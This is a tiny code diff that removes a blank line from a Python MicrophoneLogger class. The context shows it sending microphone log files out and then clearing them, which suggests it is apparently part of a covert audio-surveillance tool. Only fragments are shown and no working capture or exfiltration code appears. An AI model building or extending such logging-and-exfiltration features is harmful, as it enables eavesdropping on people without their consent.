@@ -37,7 +37,6 @@ class MicrophoneLogger:
         except sounddevice.PortAudioError as e:
             log_info(f"Microphone not available: {e}")
 
-
     def send_logs(self):
         send_log_files_in_directory("`Sending microphone logs...`", self.log_directory)
         clear_files_in_log_directory(self.log_directory)
